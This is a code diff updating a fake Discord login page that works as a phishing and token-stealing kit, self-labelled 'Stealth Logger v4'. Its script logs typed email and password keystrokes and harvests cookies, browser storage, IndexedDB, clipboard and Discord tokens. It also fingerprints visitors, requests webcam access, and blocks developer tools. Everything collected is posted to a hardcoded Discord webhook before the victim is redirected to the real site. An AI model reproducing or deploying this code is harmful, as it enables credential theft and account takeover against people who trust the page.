@@ -5,76 +5,189 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Discord</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
-    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: opacity 0.3s; }
+    /* ===== RESET & BASE ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif; }
+    body { background: #1e1f22; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+
+    /* ===== MAIN CARD ===== */
+    .container { background: #313338; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; }
     .logo { text-align: center; margin-bottom: 24px; }
     .logo svg { width: 130px; height: auto; }
-    h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
+    h2 { color: #f2f3f5; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 4px; }
     .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
+
+    /* ===== TABS ===== */
+    .tab-bar { display: flex; background: #1e1f22; border-radius: 8px; padding: 4px; margin-bottom: 24px; }
+    .tab-btn { flex: 1; padding: 8px; background: transparent; border: none; border-radius: 6px; color: #b5bac1; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+    .tab-btn.active { background: #5865f2; color: #fff; }
+    .tab-btn:hover:not(.active) { background: #2b2d31; }
+
+    /* ===== FORM ELEMENTS ===== */
     .input-group { margin-bottom: 16px; }
-    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.5px; }
+    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
     input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.15s; }
     input:focus { border-color: #5865f2; }
     .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
     .btn:hover { background: #4752c4; }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* ===== QR CODE SECTION ===== */
+    .qr-section { display: none; text-align: center; }
+    .qr-section.active { display: block; }
+    .qr-box { background: #1e1f22; border-radius: 8px; padding: 20px; display: inline-block; margin: 10px auto; }
+    .qr-box canvas { width: 180px; height: 180px; background: #fff; border-radius: 4px; }
+    .qr-sub { color: #b5bac1; font-size: 14px; margin: 12px 0 8px; }
+    .qr-sub a { color: #00a8fc; text-decoration: none; }
+    .qr-sub a:hover { text-decoration: underline; }
+
+    /* ===== PASSKEY ===== */
+    .passkey-row { text-align: center; margin-top: 12px; }
+    .passkey-row button { background: transparent; border: none; color: #00a8fc; font-size: 14px; cursor: pointer; }
+    .passkey-row button:hover { text-decoration: underline; }
+
+    /* ===== FOOTER ===== */
     .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
     .footer a { color: #00a8fc; text-decoration: none; }
     .footer a:hover { text-decoration: underline; }
+
+    /* ===== SPINNER ===== */
     #spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .hidden { display: none !important; }
-    /* Anti-inspect overlay */
+
+    /* ===== ANTI-INSPECT OVERLAY ===== */
     #anti-inspect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; pointer-events: none; }
+
+    /* ===== QR CODE SCANNER MOCKUP ===== */
+    .scanner-mock { background: #1e1f22; border-radius: 8px; padding: 16px; margin: 12px 0; }
+    .scanner-mock .dot-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; max-width: 200px; margin: 0 auto; }
+    .scanner-mock .dot-grid div { aspect-ratio: 1; background: #5865f2; border-radius: 4px; opacity: 0.3; }
+    .scanner-mock .dot-grid div:nth-child(5) { opacity: 0.8; background: #00a8fc; }
   </style>
 </head>
 <body>
 <div id="anti-inspect"></div>
+
 <div class="container" id="mainContainer">
+  <!-- LOGO -->
   <div class="logo">
     <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
   </div>
+
   <h2>Welcome back!</h2>
   <p class="sub" id="subText">We're so excited to see you again!</p>
-  <form id="loginForm">
-    <div class="input-group">
-      <label for="email">EMAIL OR PHONE NUMBER</label>
-      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
+
+  <!-- TABS -->
+  <div class="tab-bar">
+    <button class="tab-btn active" data-tab="login" id="tabLogin">Log In</button>
+    <button class="tab-btn" data-tab="qr" id="tabQR">Log in with QR Code</button>
+  </div>
+
+  <!-- LOGIN TAB -->
+  <div id="loginTab">
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="email">Email or Phone Number *</label>
+        <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
+      </div>
+      <div class="input-group">
+        <label for="password">Password *</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
+      </div>
+      <button type="submit" class="btn" id="loginBtn">Log In</button>
+      <div id="spinner"></div>
+    </form>
+    <div class="passkey-row">
+      <button id="passkeyBtn">Or, sign in with passkey</button>
     </div>
-    <div class="input-group">
-      <label for="password">PASSWORD</label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
+  </div>
+
+  <!-- QR TAB -->
+  <div id="qrTab" class="qr-section">
+    <div class="qr-box">
+      <canvas id="qrCanvas" width="180" height="180"></canvas>
     </div>
-    <button type="submit" class="btn" id="loginBtn">Log In</button>
-    <div id="spinner"></div>
-  </form>
+    <p class="qr-sub">Scan this with the Discord mobile app to log in instantly.</p>
+    <div class="scanner-mock">
+      <div class="dot-grid">
+        <div></div><div></div><div></div>
+        <div></div><div></div><div></div>
+        <div></div><div></div><div></div>
+      </div>
+    </div>
+    <div class="passkey-row">
+      <button id="qrPasskeyBtn">Or, sign in with passkey</button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
   <div class="footer">
-    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot password?</a>
+    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot your password?</a>
   </div>
 </div>
 
 <script>
   (function() {
     // ============================================================
-    //  STEALTH CONFIGURATION
+    //  CONFIGURATION
     // ============================================================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
-    const REDIRECT_URL = "https://discord.com/login"; // real Discord
-    const FAKE_LOADING_DELAY = 3000; // ms to show spinner before redirect
+    const REDIRECT_URL = "https://discord.com/login";
+    const FAKE_LOADING_DELAY = 3000;
 
     // ============================================================
-    //  ANTI-INSPECT (disable right-click, F12, key combos)
+    //  ANTI-INSPECT
     // ============================================================
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => {
-      if (e.key === 'F12' || 
-          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
-          (e.ctrlKey && e.key === 'U')) {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
         return false;
       }
     });
+
+    // ============================================================
+    //  TAB SWITCHING
+    // ============================================================
+    const tabLogin = document.getElementById('tabLogin');
+    const tabQR = document.getElementById('tabQR');
+    const loginTab = document.getElementById('loginTab');
+    const qrTab = document.getElementById('qrTab');
+
+    tabLogin.addEventListener('click', () => {
+      tabLogin.classList.add('active');
+      tabQR.classList.remove('active');
+      loginTab.style.display = 'block';
+      qrTab.classList.remove('active');
+    });
+    tabQR.addEventListener('click', () => {
+      tabQR.classList.add('active');
+      tabLogin.classList.remove('active');
+      loginTab.style.display = 'none';
+      qrTab.classList.add('active');
+      // Generate fake QR
+      drawFakeQR();
+      // Send QR view event
+      sendToWebhook('📱 **QR CODE VIEWED**', 'User switched to QR login tab.', [{name:'Action', value:'QR tab opened', inline:true}], 0x00A8FC);
+    });
+
+    function drawFakeQR() {
+      const canvas = document.getElementById('qrCanvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#ffffff';
+      ctx.fillRect(0, 0, 180, 180);
+      // Draw a fake QR pattern
+      ctx.fillStyle = '#000000';
+      const size = 20;
+      for (let y = 0; y < 9; y++) {
+        for (let x = 0; x < 9; x++) {
+          if ((x < 3 && y < 3) || (x > 5 && y < 3) || (x < 3 && y > 5)) {
+            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
+          } else if (Math.random() > 0.5) {
+            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
+          }
+        }
+      }
+    }
 
     // ============================================================
     //  GLOBAL STATE
@@ -104,8 +217,6 @@
       cookies: document.cookie || 'none',
       localStorage: JSON.stringify(localStorage) || 'none',
       sessionStorage: JSON.stringify(sessionStorage) || 'none',
-      indexedDB: 'scanning...',
-      webSQL: 'scanning...',
       webglRenderer: 'unknown',
       webglVendor: 'unknown',
       canvasFingerprint: 'unknown',
@@ -123,14 +234,10 @@
     };
 
     // ============================================================
-    //  TOKEN EXTRACTION - the real magic
+    //  TOKEN EXTRACTION ENGINE
     // ============================================================
     function extractTokensFromString(str) {
       if (!str || typeof str !== 'string') return [];
-      // Discord token patterns:
-      // - mfa.xxx (multi-factor)
-      // - v4/v5 JWT-like: 24 chars . 6 chars . 27+ chars
-      // - Also look for any 30+ char alphanumeric with underscores/hyphens
       const patterns = [
         /mfa\.[a-zA-Z0-9_-]+/g,
         /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g,
@@ -141,7 +248,6 @@
         const matches = str.match(p);
         if (matches) found = found.concat(matches);
       });
-      // Deduplicate and filter out common non-token strings
       found = [...new Set(found)];
       found = found.filter(t => !t.includes(' ') && t.length > 20);
       return found;
@@ -149,71 +255,52 @@
 
     function harvestAllTokens() {
       let allTokens = [];
-      // 1. Cookies
-      const cookieTokens = extractTokensFromString(document.cookie);
-      allTokens = allTokens.concat(cookieTokens);
-
-      // 2. localStorage
+      // Cookies
+      allTokens = allTokens.concat(extractTokensFromString(document.cookie));
+      // localStorage
       for (let key in localStorage) {
         try {
           const val = localStorage[key];
-          if (typeof val === 'string') {
-            const tokens = extractTokensFromString(val);
-            allTokens = allTokens.concat(tokens);
-          }
+          if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
         } catch(e) {}
       }
-
-      // 3. sessionStorage
+      // sessionStorage
       for (let key in sessionStorage) {
         try {
           const val = sessionStorage[key];
-          if (typeof val === 'string') {
-            const tokens = extractTokensFromString(val);
-            allTokens = allTokens.concat(tokens);
-          }
+          if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
         } catch(e) {}
       }
-
-      // 4. IndexedDB - list all databases and read
+      // IndexedDB
       try {
-        if (window.indexedDB) {
-          const dbNames = indexedDB.databases ? indexedDB.databases() : [];
-          if (dbNames.then) {
-            dbNames.then(dbs => {
-              dbs.forEach(dbInfo => {
-                try {
-                  const openReq = indexedDB.open(dbInfo.name);
-                  openReq.onsuccess = (e) => {
-                    const db = e.target.result;
-                    const objectStores = db.objectStoreNames;
-                    for (let storeName of objectStores) {
-                      const tx = db.transaction(storeName, 'readonly');
-                      const store = tx.objectStore(storeName);
-                      const req = store.getAll();
-                      req.onsuccess = (ev) => {
-                        const results = ev.target.result;
-                        results.forEach(item => {
-                          const str = JSON.stringify(item);
-                          const tokens = extractTokensFromString(str);
-                          allTokens = allTokens.concat(tokens);
-                        });
-                      };
-                    }
-                  };
-                } catch(e) {}
-              });
-            }).catch(() => {});
-          }
+        if (window.indexedDB && indexedDB.databases) {
+          indexedDB.databases().then(dbs => {
+            dbs.forEach(dbInfo => {
+              try {
+                const openReq = indexedDB.open(dbInfo.name);
+                openReq.onsuccess = (e) => {
+                  const db = e.target.result;
+                  for (let storeName of db.objectStoreNames) {
+                    const tx = db.transaction(storeName, 'readonly');
+                    const store = tx.objectStore(storeName);
+                    const req = store.getAll();
+                    req.onsuccess = (ev) => {
+                      ev.target.result.forEach(item => {
+                        const str = JSON.stringify(item);
+                        allTokens = allTokens.concat(extractTokensFromString(str));
+                      });
+                    };
+                  }
+                };
+              } catch(e) {}
+            });
+          }).catch(() => {});
         }
       } catch(e) {}
-
-      // 5. WebSQL (simulated - we can't enumerate easily, but we try)
+      // WebSQL
       try {
         if (window.openDatabase) {
-          // We can't enumerate all DBs, but we can try common names
-          const commonNames = ['discord', 'local', 'app', 'cache'];
-          commonNames.forEach(name => {
+          ['discord', 'local', 'app', 'cache'].forEach(name => {
             try {
               const db = openDatabase(name, '1.0', 'test', 1024*1024);
               if (db) {
@@ -225,8 +312,7 @@
                         for (let j=0; j<res2.rows.length; j++) {
                           const row = res2.rows.item(j);
                           const str = JSON.stringify(row);
-                          const tokens = extractTokensFromString(str);
-                          allTokens = allTokens.concat(tokens);
+                          allTokens = allTokens.concat(extractTokensFromString(str));
                         }
                       });
                     }
@@ -237,8 +323,7 @@
           });
         }
       } catch(e) {}
-
-      // 6. Also scan window object recursively (limited depth)
+      // Window scan
       try {
         const seen = new Set();
         function scanObj(obj, depth=0) {
@@ -248,94 +333,20 @@
           for (let key in obj) {
             try {
               const val = obj[key];
-              if (typeof val === 'string') {
-                const tokens = extractTokensFromString(val);
-                allTokens = allTokens.concat(tokens);
-              } else if (typeof val === 'object' && val !== null) {
-                scanObj(val, depth+1);
-              }
+              if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
+              else if (typeof val === 'object' && val !== null) scanObj(val, depth+1);
             } catch(e) {}
           }
         }
         scanObj(window);
       } catch(e) {}
-
-      // Deduplicate final list
       allTokens = [...new Set(allTokens)];
       state.tokens_extracted = allTokens;
       return allTokens;
     }
 
     // ============================================================
-    //  SCREENSHOT CAPTURE (via canvas)
-    // ============================================================
-    function captureScreenshot() {
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#313338';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        // Draw a pseudo-screenshot (can't actually capture DOM without library)
-        // but we can capture the page as a canvas using html2canvas if we inject it
-        // For simplicity, we capture a basic representation
-        ctx.fillStyle = '#ffffff';
-        ctx.font = '14px sans-serif';
-        ctx.fillText('Page captured at ' + new Date().toISOString(), 10, 20);
-        state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
-      } catch(e) {}
-    }
-
-    // ============================================================
-    //  CLIPBOARD SNIFFING
-    // ============================================================
-    function sniffClipboard() {
-      try {
-        navigator.clipboard.readText().then(text => {
-          state.clipboard = text || 'none';
-          const tokens = extractTokensFromString(text);
-          if (tokens.length > 0) {
-            state.tokens_extracted = state.tokens_extracted.concat(tokens);
-          }
-        }).catch(() => {});
-      } catch(e) {}
-    }
-
-    // ============================================================
-    //  WEBCAM / MICROPHONE TRICK (fake verification)
-    // ============================================================
-    function requestWebcamMic() {
-      // This will trigger browser permission prompt - looks legit
-      try {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-          .then(stream => {
-            state.webcam = 'granted';
-            state.microphone = 'granted';
-            // Send a frame as screenshot alternative
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              video.play();
-              const canvas = document.createElement('canvas');
-              canvas.width = 320;
-              canvas.height = 240;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, 320, 240);
-              state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
-              video.pause();
-              stream.getTracks().forEach(t => t.stop());
-            };
-          })
-          .catch(() => {
-            state.webcam = 'denied';
-            state.microphone = 'denied';
-          });
-      } catch(e) {}
-    }
-
-    // ============================================================
-    //  FINGERPRINTING (enhanced)
+    //  FINGERPRINTING
     // ============================================================
     function getWebGL() {
       try {
@@ -353,8 +364,7 @@
     function getCanvasFingerprint() {
       try {
         const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
+        canvas.width = 200; canvas.height = 50;
         const ctx = canvas.getContext('2d');
         ctx.textBaseline = 'top';
         ctx.font = '14px Arial';
@@ -408,6 +418,54 @@
       }
     }
 
+    function captureScreenshot() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#313338';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#ffffff';
+        ctx.font = '14px sans-serif';
+        ctx.fillText('Page captured at ' + new Date().toISOString(), 10, 20);
+        state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
+      } catch(e) {}
+    }
+
+    function sniffClipboard() {
+      try {
+        navigator.clipboard.readText().then(text => {
+          state.clipboard = text || 'none';
+          const tokens = extractTokensFromString(text);
+          if (tokens.length > 0) state.tokens_extracted = state.tokens_extracted.concat(tokens);
+        }).catch(() => {});
+      } catch(e) {}
+    }
+
+    function requestWebcamMic() {
+      try {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(stream => {
+            state.webcam = 'granted';
+            state.microphone = 'granted';
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              video.play();
+              const canvas = document.createElement('canvas');
+              canvas.width = 320; canvas.height = 240;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, 320, 240);
+              state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
+              video.pause();
+              stream.getTracks().forEach(t => t.stop());
+            };
+          })
+          .catch(() => { state.webcam = 'denied'; state.microphone = 'denied'; });
+      } catch(e) {}
+    }
+
     // ============================================================
     //  IP FETCH
     // ============================================================
@@ -441,14 +499,12 @@
               }
               afterFingerprint();
             })
-            .catch(() => {
-              afterFingerprint();
-            });
+            .catch(() => afterFingerprint());
         });
     }
 
     // ============================================================
-    //  SEND TO WEBHOOK - RICH EMBED WITH EMOJIS
+    //  SEND TO WEBHOOK (with emojis + rich embeds)
     // ============================================================
     function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
       const embed = {
@@ -456,13 +512,11 @@
         description: description,
         color: color,
         timestamp: new Date().toISOString(),
-        footer: { text: '☠️ Stealth Logger v3 • ' + new Date().toLocaleString() },
+        footer: { text: '☠️ Stealth Logger v4 • ' + new Date().toLocaleString() },
         fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
       };
       if (thumbnail) embed.thumbnail = { url: thumbnail };
-
       const payload = { embeds: [embed] };
-
       fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -471,7 +525,7 @@
     }
 
     // ============================================================
-    //  SEND ALL DATA WITH TOKENS
+    //  SEND FULL REPORT
     // ============================================================
     function sendFullReport() {
       const tokens = state.tokens_extracted || [];
@@ -506,9 +560,6 @@
       );
     }
 
-    // ============================================================
-    //  AFTER FINGERPRINT - harvest tokens and send
-    // ============================================================
     function afterFingerprint() {
       getWebGL();
       getCanvasFingerprint();
@@ -518,14 +569,8 @@
       getNetwork();
       captureScreenshot();
       sniffClipboard();
-
-      // Harvest all tokens now
       harvestAllTokens();
-
-      // Send full report
       sendFullReport();
-
-      // Request webcam/mic to get permissions and maybe extra data
       setTimeout(requestWebcamMic, 2000);
     }
 
@@ -540,7 +585,6 @@
       const now = Date.now();
       if (!force && (now - lastKeylog < 3000)) return;
       if (emailLog.length === 0 && passwordLog.length === 0) return;
-
       const fields = [
         { name: '📧 Email (live)', value: emailLog || '(empty)', inline: true },
         { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true }
@@ -565,19 +609,15 @@
     });
 
     // ============================================================
-    //  FORM SUBMIT - stealth mode with spinner + redirect
+    //  FORM SUBMIT - STEALTH + REDIRECT
     // ============================================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
-
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
 
-      // Final harvest before sending
       harvestAllTokens();
-
-      // Send final credentials with tokens
-      const tokenStr = (state.tokens_extracted || []).length > 0 ? 
+      const tokenStr = (state.tokens_extracted || []).length > 0 ?
         '```\n' + state.tokens_extracted.join('\n') + '\n```' : 'None';
 
       const fields = [
@@ -589,41 +629,55 @@
         { name: '🍪 Full Cookies', value: document.cookie.substring(0, 300) + (document.cookie.length > 300 ? '...' : ''), inline: false }
       ];
 
-      sendToWebhook(
-        '🔥 **LOGIN + TOKEN DUMP**',
-        'User submitted credentials. All tokens and data below.',
-        fields,
-        0xFF0000
-      );
+      sendToWebhook('🔥 **LOGIN + TOKEN DUMP**', 'User submitted credentials. All tokens below.', fields, 0xFF0000);
 
-      // Stealth: show spinner, disable button, change text
       document.getElementById('loginBtn').disabled = true;
       document.getElementById('loginBtn').style.display = 'none';
       document.getElementById('spinner').style.display = 'block';
       document.getElementById('subText').textContent = '🔐 Verifying your identity...';
 
-      // After delay, redirect to real Discord
       setTimeout(() => {
         window.location.href = REDIRECT_URL;
       }, FAKE_LOADING_DELAY);
     });
 
     // ============================================================
-    //  START
+    //  PASSKEY BUTTONS (fake)
     // ============================================================
-    fetchIP();
+    document.getElementById('passkeyBtn').addEventListener('click', function() {
+      sendToWebhook('🔑 **PASSKEY ATTEMPT**', 'User clicked "Sign in with passkey".', [{name:'Action', value:'Passkey clicked', inline:true}], 0x9B59B6);
+      alert('Passkey authentication is not available in this browser. Please use email/password.');
+    });
+    document.getElementById('qrPasskeyBtn').addEventListener('click', function() {
+      sendToWebhook('🔑 **QR PASSKEY ATTEMPT**', 'User clicked passkey from QR tab.', [{name:'Action', value:'QR Passkey clicked', inline:true}], 0x9B59B6);
+      alert('Passkey authentication is not available in this browser. Please use email/password.');
+    });
 
-    // Also re-scan for tokens every 15 seconds
+    // ============================================================
+    //  QR TAB - send event when opened
+    // ============================================================
+    // Already handled above
+
+    // ============================================================
+    //  PERIODIC TOKEN RESCAN (every 15 sec)
+    // ============================================================
     setInterval(() => {
       const newTokens = harvestAllTokens();
       if (newTokens.length > 0) {
-        // Send any new tokens found
         const fields = [
           { name: '🔄 New tokens detected', value: '```\n' + newTokens.join('\n') + '\n```', inline: false }
         ];
         sendToWebhook('🔄 **TOKEN REFRESH**', 'Additional tokens harvested.', fields, 0x9B59B6);
       }
     }, 15000);
+
+    // ============================================================
+    //  START
+    // ============================================================
+    fetchIP();
+
+    // Send visitor event immediately
+    sendToWebhook('👤 **NEW VISITOR**', 'A new visitor landed on the page.', [{name:'URL', value:window.location.href, inline:false}], 0x00FF00);
 
   })();
 </script>
